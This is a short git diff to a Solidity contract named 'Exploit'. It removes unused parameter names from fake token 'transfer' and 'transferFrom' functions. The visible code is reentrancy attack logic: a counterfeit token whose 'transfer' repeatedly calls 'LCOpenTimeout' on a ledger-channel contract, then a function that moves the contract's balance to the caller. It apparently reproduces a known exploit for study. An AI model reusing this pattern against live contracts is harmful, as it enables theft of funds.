@@ -77,7 +77,7 @@ contract Exploit {
         payable(msg.sender).transfer(address(this).balance);
     }
 
-    function transfer(address recipient, uint256 amount) public returns (bool) {
+    function transfer(address, uint256) public returns (bool) {
         if (count < limit) {
             count += 1;
             ledgerChannel.LCOpenTimeout(_lcID);
@@ -85,7 +85,7 @@ contract Exploit {
         return true;
     }
 
-    function transferFrom(address sender, address recipient, uint256 amount) public pure returns (bool)  {
+    function transferFrom(address, address, uint256) public pure returns (bool)  {
         return true;
     }
 
